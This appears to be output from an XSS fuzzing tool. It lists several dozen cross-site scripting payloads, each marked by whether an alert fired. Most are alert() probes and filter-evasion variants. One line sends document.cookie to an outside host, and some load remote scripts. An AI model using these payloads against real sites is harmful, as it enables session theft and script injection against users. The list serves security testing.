+Payload: <img src="blah"onmouseover="document.vulnerable=true;"> | Alert: False
+Payload: <img src="blah>" onmouseover="document.vulnerable=true;"> | Alert: False
+Payload: <xml src="javascript:document.vulnerable=true;"> | Alert: False
+Payload: <xml id="X"><a><b><script>document.vulnerable=true;</script>;</b></a></xml> | Alert: False
+Payload: <meta HTTP-EQUIV="Link" Content="<http://www.securitycompass.com/xss.css>; REL=stylesheet"> | Alert: False
+Payload: <script>document.write("<SCRI");</SCRIPT>PT SRC="http://www.securitycompass.com/xss.js"></script> | Alert: False
+Payload: <~/XSS/*-*/STYLE=xss:e/**/xpression(window.location="http://www.procheckup.com/?sid="%2bdocument.cookie)> | Alert: False
+Payload: "><script>alert('XSS')</script> | Alert: True
+Payload: >"><script>alert("XSS")</script>& | Alert: True
+Payload: "><STYLE>@import"javascript:alert('XSS')";</STYLE> | Alert: False
+Payload: >%22%27><img%20src%3d%22javascript:alert(%27%20XSS%27)%22> | Alert: False
+Payload: <IMG SRC="javascript:alert('XSS');"> | Alert: False
+Payload: <IMG SRC=javascript:alert('XSS')> | Alert: False
+Payload: <IMG SRC=JaVaScRiPt:alert('XSS')> | Alert: False
+Payload: <IMG SRC=JaVaScRiPt:alert(&quot;XSS<WBR>&quot;)> | Alert: False
+Payload: <![CDATA[<script>var n=0;while(true){n++;}</script>]]> | Alert: False
+Payload: <script>alert('XSS')</script> | Alert: True
+Payload: <IMG SRC="javascript:alert('XSS');"> | Alert: False
+Payload: <IMG SRC=javascript:alert(&quot;XSS&quot;)> | Alert: False
+Payload: <IMG SRC=javascript:alert('XSS')> | Alert: False
+Payload: <img src=xss onerror=alert(1)> | Alert: True
+Payload: <IMG """><SCRIPT>alert("XSS")</SCRIPT>"> | Alert: True
+Payload: <IMG SRC=javascript:alert(String.fromCharCode(88,83,83))> | Alert: False
+Payload: <IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;> | Alert: False
+Payload: <IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041> | Alert: False
+Payload: <IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29> | Alert: False
+Payload: <BODY BACKGROUND="javascript:alert('XSS')"> | Alert: False
+Payload: <INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');"> | Alert: False
+Payload: <IMG SRC="javascript:alert('XSS')" | Alert: False
+Payload: "><s"%2b"cript>alert(document.cookie)</script> | Alert: False
+Payload: foo<script>alert(1)</script> | Alert: True
+Payload: <scr<script>ipt>alert(1)</scr</script>ipt> | Alert: False
+Payload: <SCRIPT>String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 41)</SCRIPT> | Alert: False
+Payload: ';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT> | Alert: True
+Payload: <marquee onstart='javascript:alert('1');'>=(◕_◕)= | Alert: False
